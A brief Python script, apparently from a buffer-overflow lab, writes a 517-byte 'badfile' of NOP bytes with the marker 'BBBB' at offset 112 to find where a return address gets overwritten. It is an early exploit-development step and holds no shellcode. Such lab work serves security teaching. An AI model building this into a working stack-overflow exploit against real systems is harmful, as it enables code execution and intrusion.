#!/usr/bin/python3

# Create a pattern to identify exactly where the return address is
content = bytearray(0x90 for i in range(517))

# Put a distinctive pattern at our calculated offset
offset = 112
content[offset:offset + 4] = b'BBBB'  # This should overwrite return address

with open('badfile', 'wb') as f:
    f.write(content)
